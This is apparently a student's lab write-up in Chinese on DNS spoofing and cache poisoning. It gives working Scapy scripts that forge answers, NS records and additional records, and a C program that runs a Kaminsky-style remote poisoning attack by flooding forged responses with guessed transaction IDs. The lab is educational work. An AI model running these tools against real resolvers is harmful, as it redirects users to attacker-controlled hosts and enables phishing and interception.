# DNS

## DNS LOCAL

### 1 DNS 配置测试

```shell
dig ns.attakcer32.com
```

![image-20260329140846984](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329140846984.png)

回复与攻击者域名服务器上设置的区域文件`zone_attacker32.com`中的内容一致

![image-20260329142031838](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329142031838.png)

因此配置正确

```shell
dig www.example.com
```

![image-20260329142243008](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329142243008.png)

```shell
dig @ns.attacker32.com www.example.com
```

![image-20260329142356332](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329142356332.png)

攻击者给出了伪造的回复，正确的是`104.18.27.120`和`104.18.26.120`，伪造的是`1.2.3.5`

![image-20260329143226626](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329143226626.png)

### 2.1 直接向用户伪造回应

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))


    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)           # 创建 IP 对象
    udp = UDP(dport = pkt[IP].sport, sport = 53)         # 创建 UDP 对象
    Anssec = DNSRR(rrname = pkt[DNS].qd.qname , type = 'A', rdata = '1.2.3.5', ttl = 259200)    # 创建答案记录
    dns = DNS(id = pkt[DNS].id, aa = 1, rd = 0, qdcount = 1, qr = 1, ancount = 1, qd = pkt[DNS].qd, an = Anssec)         # 创建 DNS 对象
    spoofpkt = ip/udp/dns  # 拼装出伪造的 DNS 数据包
    send(spoofpkt)


myFilter = "udp and dst port 53 and src host 10.9.0.53"    # 设置过滤器
pkt=sniff(iface='br-1d686271808f', filter=myFilter, prn=spoof_dns)
```

在攻击前先清除dns缓存`rndc flush`

![image-20260329144559248](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329144559248.png)



成功

### 2.2 DNS 缓存中毒

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))


    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)           # 创建 IP 对象
    udp = UDP(dport = pkt[IP].sport, sport = 53)         # 创建 UDP 对象
    Anssec = DNSRR(rrname = pkt[DNS].qd.qname , type = 'A', rdata = '1.2.3.5', ttl = 259200)    # 创建答案记录
    dns = DNS(id = pkt[DNS].id, aa = 1, rd = 0, qdcount = 1, qr = 1, ancount = 1, qd = pkt[DNS].qd, an = Anssec)         # 创建 DNS 对象
    spoofpkt = ip/udp/dns  # 拼装出伪造的 DNS 数据包
    send(spoofpkt)


myFilter = "udp and dst port 53 and src host 10.9.0.53"    # 设置过滤器
pkt=sniff(iface='br-1d686271808f', filter=myFilter, prn=spoof_dns)
```

![image-20260329145408003](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329145408003.png)

成功

### 2.3 伪造NS记录

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))


    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)           # 创建 IP 对象
    udp = UDP(dport = pkt[IP].sport, sport = 53)         # 创建 UDP 对象
    Nssec = DNSRR(rrname = 'example.com' , type = 'NS', rdata = 'ns.attacker32.com', ttl = 259200)
    dns = DNS(id = pkt[DNS].id, aa = 1, rd = 0, qdcount = 1, qr = 1, nscount = 1, qd = pkt[DNS].qd, ns = Nssec)         # 创建 DNS 对象
    spoofpkt = ip/udp/dns  # 拼装出伪造的 DNS 数据包
    send(spoofpkt)


myFilter = "udp and dst port 53 and src host 10.9.0.53"    # 设置过滤器
pkt=sniff(iface='br-1d686271808f', filter=myFilter, prn=spoof_dns)
```



![image-20260329150130444](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329150130444.png)

成功

### 2.4 伪造另一个域的NS记录

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))


    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)           # 创建 IP 对象
    udp = UDP(dport = pkt[IP].sport, sport = 53)         # 创建 UDP 对象
    Nssec = DNSRR(rrname = 'example.com' , type = 'NS', rdata = 'ns.attacker32.com', ttl = 259200)
    Nssec_g = DNSRR(rrname = 'google.com' , type = 'NS', rdata = 'ns.attacker32.com', ttl = 259200)
    dns = DNS(id = pkt[DNS].id, aa = 1, rd = 0, qdcount = 1, qr = 1, nscount = 2, qd = pkt[DNS].qd, ns = Nssec_g/Nssec)         # 创建 DNS 对象
    spoofpkt = ip/udp/dns  # 拼装出伪造的 DNS 数据包
    send(spoofpkt)


myFilter = "udp and dst port 53"    # 设置过滤器
pkt=sniff(iface='br-1d686271808f', filter=myFilter, prn=spoof_dns)
```

![image-20260329155035478](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329155035478.png)

攻击成功

![image-20260329151751405](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329151751405.png)

发现example.com修改成功，但并没有加入google.com的NS记录

是因为google.com并不在attacker.com域内所以这条NS被丢弃了。

### 2.5 在附加部分伪造记录

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))


    ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)           # 创建 IP 对象
    udp = UDP(dport = pkt[IP].sport, sport = 53)         # 创建 UDP 对象
    Nssec = DNSRR(rrname = 'example.com' , type = 'NS', rdata = 'ns.attacker32.com', ttl = 259200)
    Nssec_1 = DNSRR(rrname = 'example.com' , type = 'NS', rdata = 'ns.example.com', ttl = 259200)
    Adsec_1 = DNSRR(rrname = 'ns.attacker32.com' , type = 'A', rdata = '1.2.3.4', ttl = 259200)
    Adsec_2 = DNSRR(rrname = 'ns.example.net' , type = 'A', rdata = '5.6.7.8', ttl = 259200)
    Adsec_3 = DNSRR(rrname = 'www.facebook.com' , type = 'A', rdata = '3.4.5.6', ttl = 259200)
    dns = DNS(id = pkt[DNS].id, aa = 1, rd = 0, qdcount = 1, qr = 1, nscount = 2, arcount = 3, qd = pkt[DNS].qd, ns = Nssec_1/Nssec, ar = Adsec_1/Adsec_2/Adsec_3)         # 创建 DNS 对象
    spoofpkt = ip/udp/dns  # 拼装出伪造的 DNS 数据包
    send(spoofpkt)


myFilter = "udp and dst port 53"    # 设置过滤器
pkt=sniff(iface='br-1d686271808f', filter=myFilter, prn=spoof_dns)
```

![image-20260329155340049](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329155340049.png)

攻击成功，查询缓存

![image-20260329154001583](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329154001583.png)

```python
    Adsec_2 = DNSRR(rrname = 'ns.example.net' , type = 'A', rdata = '5.6.7.8', ttl = 259200)
    Adsec_3 = DNSRR(rrname = 'www.facebook.com' , type = 'A', rdata = '3.4.5.6', ttl = 259200)
```

没有被缓存。

DNS 解析器只会缓存 Additional Section 中与 Authority Section 的 NS 记录相匹配的 A/AAAA 记录。



## DNS REMOTE

### 2 构建DNS请求

```python
#!/usr/bin/env python3
from scapy.all import *

Qdsec  = DNSQR(qname='notexist.example.com')
dns    = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,
             arcount=0, qd=Qdsec)

ip  = IP(dst='10.9.0.53', src='10.9.0.5')
udp = UDP(dport=53, sport=33333, chksum=0)
request = ip/udp/dns


send(request)
```

![image-20260329161534587](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329161534587.png)

10.9.0.53向别的DNS服务器请求

### 3 伪造DNS响应

![image-20260329163600635](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329163600635.png)

![image-20260329163541990](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329163541990.png)

因此example.com 的合法域名服务器的IP地址可以选择 173.245.58.162

```python
#!/usr/bin/env python3
from scapy.all import *

name   = 'www.example.com'
domain = 'example.com'
ns     = 'ns.attacker32.com'

Qdsec  = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,   type='A',  rdata='1.2.3.4', ttl=259200)
NSsec  = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns    = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)

ip    = IP(dst='10.9.0.53', src='173.245.58.162')	#目标ip是local dns server，源ip是example的合法域名服务器
udp   = UDP(dport=33333, sport=53, chksum=0)	#配置文件中将源端口号固定为 33333
reply = ip/udp/dns
send(reply)
```

![image-20260329164221763](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329164221763.png)

成功发送伪造的响应包

### 4

#### 生成请求数据包

```python
#!/usr/bin/python3
from scapy.all import *

IPpkt  = IP(src='10.9.0.5',dst='10.9.0.53')
UDPpkt = UDP(sport=12345, dport=53,chksum=0)

Qdsec    = DNSQR(qname='notexist.example.com')
DNSpkt   = DNS(id=0xAAAA, qr=0, qdcount=1, qd=Qdsec)
Querypkt = IPpkt/UDPpkt/DNSpkt

with open('ip_req.bin', 'wb') as f:
  f.write(bytes(Querypkt))
  Querypkt.show()
```

#### 生成响应数据包

```python
#!/usr/bin/python3
from scapy.all import *

targetName = 'abcde.example.com'
targetDomain = 'example.com'

IPpkt = IP(src='173.245.58.162', dst='10.9.0.53', chksum=0)
UDPpkt = UDP(sport=53, dport=33333, chksum=0)

Qdsec  = DNSQR(qname=targetName)
Anssec = DNSRR(rrname=targetName, type='A',
               rdata='1.2.3.4', ttl=259200)
NSsec  = DNSRR(rrname=targetDomain, type='NS',
               rdata='ns.attacker32.com', ttl=259200)

DNSpkt = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)
Replypkt = IPpkt/UDPpkt/DNSpkt
with open('ip_resp.bin', 'wb') as f:
  f.write(bytes(Replypkt))
  Replypkt.show()
```

#### 发动攻击

```c
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address
  struct  in_addr    iph_destip;   //Destination IP address
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(unsigned char* pkt, int pktsize, char* name);
void send_dns_response(unsigned char* pkt, int pktsize, unsigned char* src, char* name, unsigned short id);

int main()
{
  srand(time(NULL));

  unsigned short transid = 0;

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];

    //##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */

    // ... Students should add code here.

    send_dns_request(ip_req, n_req, name);


    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */

    // ... Students should add code here.

    for(int i = 0; i < 500; i++){
      send_dns_response(ip_resp, n_resp, "173.245.58.162", name, transid);
      transid++;
    }

    //##################################################################
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(unsigned char* pkt, int pktsize, char* name)
{
  // replace in qname with name, at offset 41
  memcpy(pkt+41, name, 5);
  // send the dns query out
  send_raw_packet(pkt, pktsize);
}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(unsigned char* pkt, int pktsize,
                       unsigned char* src, char* name,
                       unsigned short id)
{
  int ip = (int)inet_addr(src);
  memcpy(pkt+12, (void*)&ip, 4);
  // qname at offset 41
  memcpy(pkt+41, name, 5);
  // rrname at offset 64
  memcpy(pkt+64, name, 5);
  // id at offset 28
  unsigned short transid = htons(id);
  memcpy(pkt+28, (void*)&transid, 2);
  send_raw_packet(pkt, pktsize);
}


/* Send the raw packet out
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}

```



![image-20260329170720566](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329170720566.png)

![image-20260329170825647](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329170825647.png)

![image-20260329170835967](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329170835967.png)

攻击成功

第一次dig，触发了DNS和ARP

![image-20260329172029550](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260329172029550.png)

`10.9.0.5`向1`0.9.0.53`(local dns server)发起查询，local dns server继而向`10.9.0.153`(`ns.attacker32.com`)发起查询，最后该dns server返回`www.example.com`的A记录结果，攻击成功。